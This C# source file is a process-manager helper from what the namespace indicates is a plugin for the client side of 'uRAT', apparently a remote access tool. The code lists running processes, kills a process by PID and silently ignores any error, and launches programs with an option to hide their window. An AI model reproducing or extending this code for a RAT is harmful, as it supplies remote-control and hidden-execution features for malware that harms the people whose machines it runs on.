using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;


namespace uRAT.ManagersClientPlugin.ProcessManager.Tools
{
    public static class ProcessHelper
    {
        public class HighLevelProcess
        {
            public string ProcessName { get; set; }
            public int Pid { get; set; }
            public bool IsThis { get; set; }
            public string WindowName { get; set; }

            public HighLevelProcess()
            {
            }

            public HighLevelProcess(string processName, int pid, bool isThis, string windowName)
            {
                ProcessName = processName;
                Pid = pid;
                IsThis = isThis;
                WindowName = windowName;
            }
        }

        public struct StartProcessOptions
        {
            public string Filename;
            public bool NoWindow;

            public StartProcessOptions(string filename, bool noWindow)
            {
                Filename = filename;
                NoWindow = noWindow;
            }
        }

        public static void KillProcessByPid(int pid)
        {
            try
            {
                Process.GetProcessById(pid).Kill();
            }
            catch
            {
                
            }
        }

        public static List<HighLevelProcess> GetRunningProcesses()
        {
            return GetRunningProcessesImpl().ToList();
        }

        public static void StartProcess(StartProcessOptions options)
        {
            var proc = new Process
            {
                StartInfo =
                {
                    FileName = options.Filename, 
                    CreateNoWindow = options.NoWindow
                }
            };
            proc.Start();
        }

        private static IEnumerable<HighLevelProcess> GetRunningProcessesImpl()
        {
            foreach (var proc in Process.GetProcesses())
            {
               
                yield return new HighLevelProcess(
                    proc.ProcessName + ".exe",
                    proc.Id,
                    proc.Id == Process.GetCurrentProcess().Id,
                    proc.MainWindowTitle
                    );
            }
        }
    }
}
